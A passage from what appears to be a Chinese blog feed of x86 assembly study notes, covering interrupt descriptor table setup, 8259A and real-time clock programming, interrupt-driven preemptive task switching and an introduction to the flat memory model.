<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/b9132c903725144ad56a81ec7e391e95.png" class="">

<p>依次安装中断门或陷阱门：前20个中断门指向通用处理过程<strong>general_exception_handler</strong>。</p>
<pre><code class="assembly">    mov ebx,idt_linear_address         ;中断描述符表的线性地址
    xor esi,esi
.idt0:
    mov [es:ebx+esi*8],eax				;基址变址寻址
    mov [es:ebx+esi*8+4],edx
    inc esi
    cmp esi,19                         ;安装前20个异常中断处理过程
    jle .idt0
</code></pre>
<p>之后安装通过的中断门：后236个中断门都指向同一个中断处理程序<strong>general_interrupt_handler</strong>。</p>
<pre><code class="assembly">    ;其余为保留或硬件使用的中断向量
    mov eax,general_interrupt_handler  ;门代码在段内偏移地址
    mov bx,sys_routine_seg_sel         ;门代码所在段的选择子
    mov cx,0x8e00                      ;32位中断门，0特权级
    call sys_routine_seg_sel:make_gate_descriptor
    
    mov ebx,idt_linear_address         ;中断描述符表的线性地址
.idt1:
    mov [es:ebx+esi*8],eax
    mov [es:ebx+esi*8+4],edx
    inc esi
    cmp esi,255                        ;安装普通的中断处理过程
    jle .idt1
</code></pre>
<h2 id="06-为实时时钟中断创建和安装中断门"><a href="#06-为实时时钟中断创建和安装中断门" class="headerlink" title="06. 为实时时钟中断创建和安装中断门"></a>06. 为实时时钟中断创建和安装中断门</h2><p>使用实时时钟中断，默认中断号<strong>0x70</strong>，当发生<strong>0x70</strong>号中断时并不是执行一个通用的中断过程，而是执行它自己的中断处理过程<strong>rtm_0x70_interrupt_handle</strong>。</p>
<p>现在需要创建<strong>0x70</strong>号中断的中断门，并安装在中断描述符表中，用来替换原来的通用中断门。</p>
<pre><code class="assembly">    ;设置实时时钟中断处理过程
    mov eax,rtm_0x70_interrupt_handle  ;门代码在段内偏移地址
    mov bx,sys_routine_seg_sel         ;门代码所在段的选择子
    mov cx,0x8e00                      ;32位中断门，0特权级
    call sys_routine_seg_sel:make_gate_descriptor
    
    mov ebx,idt_linear_address         ;中断描述符表的线性地址
    mov [es:ebx+0x70*8],eax
    mov [es:ebx+0x70*8+4],edx
</code></pre>
<h2 id="07-加载中断描述符表寄存器IDTR"><a href="#07-加载中断描述符表寄存器IDTR" class="headerlink" title="07. 加载中断描述符表寄存器IDTR"></a>07. 加载中断描述符表寄存器IDTR</h2><p>接上一节，现在已经在中断描述符表中安装了256个中断门，除了<strong>0x70</strong>号中断，其它都指向默认的中断或异常处理程序。</p>
<p>当中断发生时，处理器如何找到中断描述符表呢？处理器中有一个中断描述符表寄存器<strong>IDTR</strong>，保存着中断描述符表<strong>IDT</strong>的线性基地址以及长度。现在应该将<strong>IDT</strong>的基地址和界限值加载到<strong>IDTR</strong>中。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/99bae412d7ff952cfc8225cb8b0a28ea.png" class="">
<p>偏移为<em>m</em>的地方开辟出6个字节的空间。前2个字节保存<strong>IDT</strong>的界限值，后4字节保存着<strong>IDT</strong>的线性基地址。执行此条指令时，处理器用段寄存器中的线性基地址加上指令中的<strong>偏移m</strong>构成物理地址访问内存取出这6个字节。然后传送到处理器内部的<strong>IDTR</strong>寄存器中。该指令在实模式下也能执行。</p>
<p>开机时，<strong>IDTR</strong>中基地址被初始化为<strong>0x00000000</strong>，界限值被初始化为<strong>0xFFFF</strong>。<strong>lidt</strong>指令不影响任何标志位。代码如下：</p>
<pre><code class="assembly">    ;准备开放中断
    mov word [pidt],256*8-1            ;IDT的界限
    mov dword [pidt+2],idt_linear_address
    lidt [pidt]                        ;加载中断描述符表寄存器IDTR
</code></pre>
<h2 id="08-重新设置8259A主片的中断向量"><a href="#08-重新设置8259A主片的中断向量" class="headerlink" title="08. 重新设置8259A主片的中断向量"></a>08. 重新设置8259A主片的中断向量</h2><p>接上一节，理论上此时就可以开放中断，对到来的中断进行处理。但是还有一个问题，若中断控制器芯片还是8259A，就需要对其重新初始化。</p>
<p><strong>BIOS</strong>会将<strong>8259A</strong>主片中断号设置为如下，基本输入输出系统会将从片中段号设置为如下：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/0faf013194812787745b38e3d79ad29e.png" class="">
<p>由于主片中断向量和异常的中断向量冲突，所以需要重新初始化中断向量。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/bb3507b237ba7570270d16a6f6990d84.png" class="">
<p>修改为后面的中断向量：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/8a32fa7cbcfac5aed5d3a2f92dcd4962.png" class="">

<p>对<strong>8259A</strong>编程需要使用初始化命令字<strong>ICW</strong>。共4个，都是单字节命令，不是单独发送的，而是按顺序全部发送一遍，<strong>ICW1~ICW4</strong>，发送哪个取决于<strong>ICW1</strong>、<strong>ICW2</strong>的内容，可能<strong>ICW3</strong>、<strong>ICW4</strong>不需要发送。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/1b3a44f5f57993fa3fde845ab5e753fe.png" class="">
<p>对于主片来说先向<strong>0x20</strong>号端口发送<strong>ICW1</strong>，对于从片来说要向<strong>0xA0</strong>号端口发送<strong>ICW1</strong>，<strong>ICW1</strong>是一个标志，每次<strong>8259A</strong>芯片接收到<strong>ICW1</strong>表示一个新的初始化过程开始了。</p>
<p>从<strong>0x20、0xA0</strong>接收到<strong>ICW1</strong>后，<strong>8259A</strong>期待从<strong>0x21、0xA0</strong>接收<strong>ICW2</strong>，后续是否期待<strong>ICW3、ICW4</strong>要看<strong>ICW1</strong>的内容。<strong>ICW1</strong>发送给<strong>0x20、0xA0</strong>号端口作为标志，之后<strong>ICW2、ICW3、ICW4</strong>会发送给<strong>0x21、0xA1</strong>号端口。</p>
<p><mark>ICW1</mark>：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/f91758bee251fd8220e7de9497bcc1d7.png" class="">

<p><mark>ICW2</mark>：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/511bc7af4ee3bcacd4ac5eae71ef3a8b.png" class="">

<p><mark>ICW3</mark>：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/13779e943bef875df248803639068b0e.png" class="">

<p><mark>ICW4</mark>：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/23d57fbce03a1e104a6cd035237449ad.png" class="">

<p>代码如下：</p>
<pre><code class="assembly">    ;设置8259A中断控制器
    mov al,0x11
    out 0x20,al                        ;ICW1：边沿触发/级联方式
    mov al,0x20
    out 0x21,al                        ;ICW2:起始中断向量
    mov al,0x04
    out 0x21,al                        ;ICW3:从片级联到IR2
    mov al,0x01
    out 0x21,al                        ;ICW4:非总线缓冲，全嵌套，正常EOI
    
    mov al,0x11
    out 0xa0,al                        ;ICW1：边沿触发/级联方式
    mov al,0x70
    out 0xa1,al                        ;ICW2:起始中断向量
    mov al,0x04
    out 0xa1,al                        ;ICW3:从片级联到IR2
    mov al,0x01
    out 0xa1,al                        ;ICW4:非总线缓冲，全嵌套，正常EOI
</code></pre>
<p>之后设置和时钟中断相关的硬件：</p>
<pre><code class="assembly">    ;设置和时钟中断相关的硬件
    mov al,0x0b			;RTC寄存器B
    or al,0x80          ;阻断NMI
    out 0x70,al
    mov al,0x12         ;设置寄存器B，禁止周期性中断，开放更
    out 0x71,al         ;新结束后中断，BCD码，24小时制
    
    in al,0xa1          ;读8259从片的IMR寄存器
    and al,0xfe         ;清除bit 0(此位连接RTC)
    out 0xa1,al         ;写回此寄存器
    
    mov al,0x0c
    out 0x70,al
    in al,0x71          ;读RTC寄存器C，复位未决的中断状态
</code></pre>
<h2 id="09-中断和异常发生似的特权级检查"><a href="#09-中断和异常发生似的特权级检查" class="headerlink" title="09. 中断和异常发生似的特权级检查"></a>09. 中断和异常发生似的特权级检查</h2><p>接上一节，目前中断描述符表已经创建，在这个表中，所有与中断、异常相关的描述符已经安装完毕。包括<mark>0x70号中断</mark>，其中断门已经安装完毕，指向其自己的中断处理过程。</p>
<p>接下来开中断，讲标志寄存器<mark>IF</mark>位置1，那么中断就可以随时进来。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/322fd7154dbaeccf68c9b55f409709b7.png" class="">
<p>当中断发生时，处理器从软中断指令、或中断控制器芯片取得中断向量。用这个向量从中断描述符表<strong>IDT</strong>中取出中断门、陷阱门、任务门，但是中断向量只是一个代表中断号码的数字，没有表指示器、<strong>RPL</strong>字段，所以中断和异常发生时不检查<strong>RPL</strong>字段；</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/36d0e5a120263624bae1c2858c3332db.png" class="">
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/03e4ed8fdb2ef8b212b089f9594fcc49.png" class="">
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/f2812cf72dc369391ac07c63b3f41e95.png" class="">


<h2 id="10-中断和异常发生时的栈切换过程"><a href="#10-中断和异常发生时的栈切换过程" class="headerlink" title="10. 中断和异常发生时的栈切换过程"></a>10. 中断和异常发生时的栈切换过程</h2><p>当中断发生时，处理器使用中断向量乘以8，到<strong>IDTR</strong>指定的中断描述符表<strong>IDT</strong>中取出一个描述符；</p>
<p>去除的描述符可能是中断门、陷阱门和任务门，中断门、陷阱门会转去执行中断处理程序，任务门会进行一个任务切换，本章并不是使用这种方式进行任务切换。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/8d8fc85f4918195b657b13bce9ecdb76.png" class="">

<ol>
<li>若目标代码段的特权级等于当前代码段的特权级，则使用当前代码段的栈，即中断和异常发生前正在使用的栈。</li>
<li>若目标代码段的特权级大于当前代码段的特权级，则处理器会切换到目标代码段的栈，那么这个新栈来自于当前任务的<strong>TSS</strong>中。从中选取一个和目标代码段相同特权级的栈。<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/6bbffc572736523b0dae80c2f7e4af88.png" class="">
当中断或异常发生时，若当前特权级<strong>CPL</strong>和目标代码段特权级<strong>DPL</strong>不同，则系统中必须至少存在一个任务。<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/53ebd2ffd1f4494590783b20c4f37c65.png" class=""></li>
</ol>
<ul>
<li>当前任务如上，若当前正在<strong>代码段2</strong>执行，则发生中断或异常，则切换到<strong>代码段1</strong>执行，且不需要切换栈。</li>
<li>若当前正在<strong>代码段3</strong>执行，则发生中断或异常，则切换到<strong>代码段1</strong>执行，此时需要切换栈</li>
</ul>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/67c03f5323edfd9544c0235661096d39.png" class="">

<ol>
<li>首先临时保存段寄存器<strong>SS</strong>和栈指针<strong>ESP</strong>；</li>
<li>根据目标代码的特权级，从当前任务的<strong>TSS</strong>中选取一个栈段指针加载到栈指针<strong>ESP</strong>；</li>
<li>将选择的栈段选择子加载到段寄存器<strong>SS</strong>，将选择的栈指针加载到<strong>ESP</strong>；</li>
<li>切换到新栈，将刚才临时保存的段寄存器<strong>SS</strong>和栈指针<strong>ESP</strong>压入新栈；</li>
<li>接着将<strong>EFLAGS</strong>、<strong>CS</strong>、<strong>EIP</strong>压入新栈；</li>
<li>对于有错误代码的异常，处理器还要将错误代码压入新栈；</li>
<li>当中断返回时，要将<strong>EFLAGS</strong>、<strong>CS</strong>、<strong>EIP</strong>恢复，还将恢复原来的栈状态，即恢复之前临时保存的段寄存器<strong>SS</strong>和栈指针<strong>ESP</strong>；</li>
<li>恢复之后段寄存器依然指向旧栈段，栈指针寄存器<strong>ESP</strong>依然指向进入中断之前的位置。</li>
</ol>
<p>中断门和陷阱门的区别不大，通过中断门进入中断处理过程时，处理器先将<strong>EFLAGS</strong>压栈，再将其<strong>IF</strong>位清零以禁止嵌套的中断，即进入中断处理程序后不允许再响应别的中断。从中断返回时，将从栈中恢复<strong>EFLAGS</strong>的原始状态。</p>
<p>陷阱门的优先级较低，通过陷阱门进入中断处理过程时，<strong>EFLAGS</strong>的IF位不变，以允许其它中断优先处理。<strong>EFLAGS</strong>的<strong>IF</strong>位只影响硬件中断，不影响<strong>NMI</strong>、异常、INT形式的软中断。</p>
<p>错误代码格式：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/06739af9c2e734f283fc024ed041df76.png" class="">

<ul>
<li><strong>EXT位</strong>：1表示由<strong>NMI</strong>、硬件中断等引发；</li>
<li><strong>IDT位</strong>：1表示段选择子索引指向中断描述符<strong>IDT</strong>中的门描述符，0表示指向<strong>GDT</strong>、<strong>LDT</strong>中的描述符；</li>
<li><strong>TI位</strong>：表示指示器，当<strong>IDT</strong>位 = 0才有意义。0表示段选择子索引指向<strong>GDT</strong>，1表示指向<strong>LDT</strong>中的段描述符或门描述符；</li>
<li><strong>段选择子索引</strong>：用于指示<strong>GDT</strong>或<strong>LDT</strong>中的段描述符、或<strong>IDT</strong>内的门描述符。就是段选择子的高13位用于索引描述符。<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/02c3a1acd2107868868cf3d50a36ffaa.png" class=""></li>
</ul>
<h2 id="11-在中断处理过程中实施任务切换（含NOP指令的介绍）"><a href="#11-在中断处理过程中实施任务切换（含NOP指令的介绍）" class="headerlink" title="11. 在中断处理过程中实施任务切换（含NOP指令的介绍）"></a>11. 在中断处理过程中实施任务切换（含NOP指令的介绍）</h2><p>接上一节，接着开放中断：</p>
<pre><code class="assembly">        sti			;开放硬件中断
</code></pre>
<p>假定在执行指令<mark>mov ebx, message_0<mark>时发生<strong>0x70号中断</strong>，这条指令完成后立即响应中断，用中断号0x70乘以8到中断描述符表中取出中断门进行特权级检查，然后进入<strong>0x70</strong>号中断的处理过程执行。</mark></mark></p>
<p>此时还没有创建内核任务，那么TR中的内容是无效的，因为<strong>0x70</strong>号中断的处理过程在内核公共例程段，特权级为0，当前特权级也是0，所以不需要切换栈，自然也不需要访问任务状态段<strong>TSS</strong>。</p>
<p><strong>0x70</strong>号中断的处理过程：</p>
<pre><code class="assembly">;-------------------------------------------------------------------------------
rtm_0x70_interrupt_handle:             ;实时时钟中断处理过程

    pushad
    
    mov al,0x20                        ;中断结束命令EOI
    out 0xa0,al                        ;向8259A从片发送
    out 0x20,al                        ;向8259A主片发送
    
    mov al,0x0c                        ;寄存器C的索引。且开放NMI
    out 0x70,al
    in al,0x71                         ;读一下RTC的寄存器C，否则只发生一次中断
               						   ;此处不考虑闹钟和周期性中断的情况
    ;请求任务调度
    call sys_routine_seg_sel:initiate_task_switch
    
    popad
    
    iretd
</code></pre>
<p>之后的内容为：</p>
<ul>
<li>显示处理器品牌信息；</li>
<li>安装调用门，对门进行测试；</li>
<li>创建内核任务相关，在创建之前使用<strong>cli</strong>指令清中断，之后<strong>sti</strong>指令开放中断；</li>
<li>创建第一个用户任务，在创建之前使用<strong>cli</strong>指令清中断，之后<strong>sti</strong>指令开放中断；<ol>
<li>在开放中断之后，若立即发生了<strong>0x70</strong>号中断，将执行任务切换，首先执行<mark>rtm_0x70_interrupt_handle</mark>，在里面先保存当前内核任务的状态到内核任务<strong>TSS</strong>中，接着将用户任务的状态从其<strong>TSS</strong>中恢复到处理器中，TR就指向用户任务，用户任务就成了当前任务。</li>
<li>第一次执行用户任务从入口点执行，先切换栈在死循环打印<mark>，，，，，，</mark>，在执行<mark>jmp .do_prn</mark>指令之前若发生了<strong>0x70</strong>号中断，又转到<mark>rtm_0x70_interrupt_handle</mark>执行；</li>
<li>这一次用户任务时当前任务，找到就绪的内核任务，先保存当前的任务也就是用户任务的状态到其<strong>TSS</strong>，然后将内核任务的状态从其<strong>TSS</strong>中恢复到处理器。此时<strong>TR</strong>指向内核任务，内核任务成为当前任务。内核任务从下面返回：<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/b98070cf32d38af1095d692179618875.png" class=""></li>
</ol>
</li>
</ul>
<p>因为之前内核任务是从这里切换出去的，然后<strong>retf</strong>返回到中断处理过程<mark>rtm_0x70_interrupt_handle</mark>，如下：返回到<strong>popad</strong>指令处。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/5332d252c92ab03ba05f620d2d165454.png" class="">

<p>再执行<mark>iretd</mark>从中断处理过程返回到内核任务中上一次<strong>0x70</strong>号中断的地方，即内核<strong>start</strong>里面的nop指令处：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/7e6e29824e3d95591e20eeb190f3c945.png" class="">
<p>添加<strong>nop</strong>指令的意图是，假定在执行这三条<strong>nop</strong>指令期间发生了<strong>0x70</strong>号中断，于是处理器又一次在内核任务中中执行中断处理过程</p>
<p>之后顺序执行代码即可。</p>
<p>其中<strong>nop</strong>指令：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/61a9d56175641a5edbf7407f56f60a6a.png" class="">
<p>在调试期间，可能需要动态修改一个正在执行的程序，例如我们想把<mark>08 c9</mark>这条跳转指令去掉又不影响其它指令，此时最好的办法就是将其修改为<mark>90 90</mark>。</p>
<h2 id="12-抢占式多任务的执行效果演示"><a href="#12-抢占式多任务的执行效果演示" class="headerlink" title="12. 抢占式多任务的执行效果演示"></a>12. 抢占式多任务的执行效果演示</h2><p>接上一节，执行<strong>nop</strong>指令之后继续创建第二个用户任务：</p>
<pre><code class="assembly">    ;为说明任务切换而特意添加的无操作指令
    nop
    nop
    nop
    
    ;可以创建更多的任务，例如：
    cli
    mov ecx,0x46
    call sys_routine_seg_sel:allocate_memory
    mov word [es:ecx+0x04],0           ;任务状态：空闲
    call append_to_tcb_link            ;将此TCB添加到TCB链中
    
    push dword 100                     ;用户程序位于逻辑100扇区
    push ecx                           ;压入任务控制块起始线性地址
    
    call load_relocate_program
    sti
</code></pre>
<p>之后的内核任务是一个无限循环：</p>
<pre><code class="assembly">.do_switch:
    mov ebx,core_msg2
    call sys_routine_seg_sel:put_string
    
    ;清理已经终止的任务，并回收它们占用的资源
    call sys_routine_seg_sel:do_task_clean
    
    hlt
    
    jmp .do_switch
</code></pre>
<p>程序加载：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/5a7cfbe8d5a437a0aaf077939a037602.png" class="">
<p>虚拟机执行：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/b5657e47353d532e0cfe1989136f34ba.png" class="">
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/image-20221113165929743.png" class="" title="image-20221113165929743">

]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>x86中断和异常</tag>
      </tags>
  </entry>
  <entry>
    <title>平坦模型</title>
    <url>/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="01-为什么要引入平坦模型及平坦模型的特点"><a href="#01-为什么要引入平坦模型及平坦模型的特点" class="headerlink" title="01. 为什么要引入平坦模型及平坦模型的特点"></a>01. 为什么要引入平坦模型及平坦模型的特点</h2><p>传统的分段模型：未开启分页机制</p>
<span id="more"></span>

<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/e4045b4ddc88eebf910e6169ed2ecf2c.png" class="">
<p>传统的分段模型：开启分页机制</p>
<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/8bef1c3680c9bc4faaf1c6d979fd2232.png" class="">
<p>不分段的管理模型，平坦模型（Flat Model）</p>
<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/c0fd4ef83504728378d25175bacdc8ed.png" class="">
<p>就是将全部的4G字节内存整体上作为一个大段来处理。每个段都指向4G字节的段，段基地址都是<strong>0</strong>、段界限都是<strong>0xFFFFF</strong>、段的粒度是<strong>4K字节</strong>。</p>
<h2 id="02-在主引导程序中创建平坦模型下的段"><a href="#02-在主引导程序中创建平坦模型下的段" class="headerlink" title="02. 在主引导程序中创建平坦模型下的段"></a>02. 在主引导程序中创建平坦模型下的段</h2><p>本章程序：<br>引导程序：<strong>c32_mbe.asm</strong>，具体看代码注释。<br>内核程序：<strong>c32_core.asm</strong><br>用户程序0：<strong>c32_app0.asm</strong><br>用户程序1：<strong>c32_app1.asm</strong></p>
<h2 id="03-平坦模型对内核程序分段的影响"><a href="#03-平坦模型对内核程序分段的影响" class="headerlink" title="03. 平坦模型对内核程序分段的影响"></a>03. 平坦模型对内核程序分段的影响</h2><p>内核程序中需要将段的定义注释掉，此后对内核代码的访问要通过指向4G字节的段。这样做是让内核程序中的标号统一编制，即具有连续的汇编地址。</p>
<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/71b6659ee05966635ef054d3bb2af257.png" class="">
<p>内核加载到<strong>0x00040000</strong>地址处、将内核重定位到内存高端之后，地址变为<strong>0x80040000</strong>。程序中可以使用<strong>org 0x80040000</strong>指令来指定内核起始汇编地址。</p>
<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/e4479fe263c946b053548fbea5eccd61.png" class="">
<p>也可以使用<strong>vfollows</strong>字句，来指定当前段的汇编地址延续上一个段的汇编地址。</p>
<p>使用平坦模型之后，在程序一开始时指定<strong>DS、CS</strong>为4G字节段之后，就不需要对段进行切换了，在程序中也就没有加载段寄存器<mark>mov ds/es</mark>的指令。</p>
<h2 id="04-平坦模型对加载内核程序的影响"><a href="#04-平坦模型对加载内核程序的影响" class="headerlink" title="04. 平坦模型对加载内核程序的影响"></a>04. 平坦模型对加载内核程序的影响</h2><p>内核程序中内核头部段的程序入口点就不需要记录其段地址、只需要记录其偏移即可</p>
<p>平坦模型不是处理器的工作模式，只是用来内存访问的一种手段。只要将整个程序看成是一个段，就可以认为采用了平坦模型。</p>
<p>具体内容看代码注释。</p>
<h2 id="05-平坦模型下的内核初始化与内核任务的确立"><a href="#05-平坦模型下的内核初始化与内核任务的确立" class="headerlink" title="05. 平坦模型下的内核初始化与内核任务的确立"></a>05. 平坦模型下的内核初始化与内核任务的确立</h2><p>本章是在开启分页，并将低端1M字节映射到高端之后才开始创建中断描述符表<strong>IDT</strong>的。<strong>IDT</strong>在高端地址为<strong>0x8001F000</strong>。</p>
<p>平坦模型下的内存布局：</p>
<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/522d7f0bee6939db5cb7421de6316d33.png" class="">
<p>平坦模式下的<strong>TCB</strong>布局：</p>
<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/2b0c617020c4dd5231887815186c41d7.png" class="">
<p>具体看代码注释。</p>
<h2 id="06-平坦模型下的用户程序结构"><a href="#06-平坦模型下的用户程序结构" class="headerlink" title="06. 平坦模型下的用户程序结构"></a>06. 平坦模型下的用户程序结构</h2><p>接上一节。</p>
<p>具体看代码注释。</p>
<h2 id="07-平坦模型下的用户任务创建"><a href="#07-平坦模型下的用户任务创建" class="headerlink" title="07. 平坦模型下的用户任务创建"></a>07. 平坦模型下的用户任务创建</h2><p>接上一节。</p>
<p>具体看代码注释。</p>
<h2 id="08-在用户任务内动态分配内存"><a href="#08-在用户任务内动态分配内存" class="headerlink" title="08. 在用户任务内动态分配内存"></a>08. 在用户任务内动态分配内存</h2><p>接上一节。</p>
<p>具体看代码注释。</p>
<h2 id="09-平坦模型下的多任务切换演示与调试"><a href="#09-平坦模型下的多任务切换演示与调试" class="headerlink" title="09. 平坦模型下的多任务切换演示与调试"></a>09. 平坦模型下的多任务切换演示与调试</h2><p>程序写入：</p>
<img src="/2022/12/11/32-%E5%B9%B3%E5%9D%A6%E6%A8%A1%E5%9E%8B/5460f778c4ae726c6f5ac450cd6b7349.png" class="">
<p><strong>Virtual Box</strong>虚拟机：</p>
